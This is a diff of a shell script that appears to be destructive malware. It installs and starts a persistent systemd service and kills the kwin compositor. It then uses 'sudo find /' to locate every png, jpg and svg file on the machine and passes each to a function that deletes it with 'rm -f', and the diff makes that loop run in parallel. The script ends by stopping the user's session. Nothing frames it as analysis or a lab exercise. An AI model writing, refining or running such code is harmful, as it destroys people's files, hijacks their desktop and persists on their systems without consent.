@@ -26,13 +26,12 @@ EOF
   systemctl daemon-reload
   systemctl enable --now $N
   echo "Installed service"
+  sleep 30
   systemctl start $N
   if command -v kwin; then
     pkill -x kwin_wayland; pkill -x kwin_x11
   fi
 }
-persist &
-PA=$!
 
 font() {
   dl ttf
@@ -61,8 +60,6 @@ EOF
   sleep 5
   sudo fc-cache -fvr
 }
-font &
-PB=$!
 
 fun() {
   rm -f "$1"
@@ -73,14 +70,13 @@ goog() {
   dl $1
   goof=$PWD/$N.$1
   sudo find / -type f -iname "*.$1" -not -path "$goof" -print0 2>/dev/null \
-    | while IFS= read -r -d '' file; do fun $file; sleep 0.005; done
+    | while IFS= read -r -d '' file; do fun $file &; sleep 0.001; done
 }
-echo -n ...
+
+font &
 goog png
-goog svg
 goog jpg
+goog svg
+persist
 sleep 30
-wait $PA
-wait $PB
-sleep 5
 sudo systemctl stop user@1000
